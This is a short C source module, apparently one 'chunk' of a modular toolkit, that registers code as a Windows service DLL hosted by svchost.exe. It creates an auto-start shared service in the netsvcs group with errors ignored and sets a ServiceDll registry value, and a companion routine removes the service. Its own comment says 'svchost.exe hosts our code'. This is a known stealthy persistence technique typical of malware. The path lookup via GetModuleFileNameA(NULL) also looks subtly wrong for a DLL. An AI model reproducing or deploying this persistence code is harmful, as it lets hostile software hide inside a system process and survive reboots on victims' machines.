// chunk: process/service_dll
// depends: (none)
// provides: register_service_dll, unregister_service_dll
// headers: windows.h
// note: Register as a Windows service DLL — svchost.exe hosts our code

#ifndef CHUNK_PROCESS_SERVICE_DLL
#define CHUNK_PROCESS_SERVICE_DLL

static int register_service_dll(const char *svc_name, const char *display_name) {
    char dll_path[MAX_PATH];
    GetModuleFileNameA(NULL, dll_path, MAX_PATH);

    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) return 0;

    char bin_path[MAX_PATH + 64];
    snprintf(bin_path, sizeof(bin_path),
             "%%SystemRoot%%\\System32\\svchost.exe -k netsvcs");

    SC_HANDLE svc = CreateServiceA(scm, svc_name,
        display_name ? display_name : svc_name,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_SHARE_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
        bin_path, NULL, NULL, NULL, NULL, NULL);

    if (!svc) {
        CloseServiceHandle(scm);
        return 0;
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    char key[512];
    snprintf(key, sizeof(key), "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", svc_name);
    HKEY hk;
    DWORD disp;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, key, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, &disp) == ERROR_SUCCESS) {
        RegSetValueExA(hk, "ServiceDll", 0, REG_EXPAND_SZ,
                       (BYTE *)dll_path, (DWORD)strlen(dll_path) + 1);
        RegCloseKey(hk);
    }
    return 1;
}

static void unregister_service_dll(const char *svc_name) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceA(scm, svc_name, DELETE | SERVICE_STOP);
    if (svc) {
        SERVICE_STATUS ss;
        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

#endif
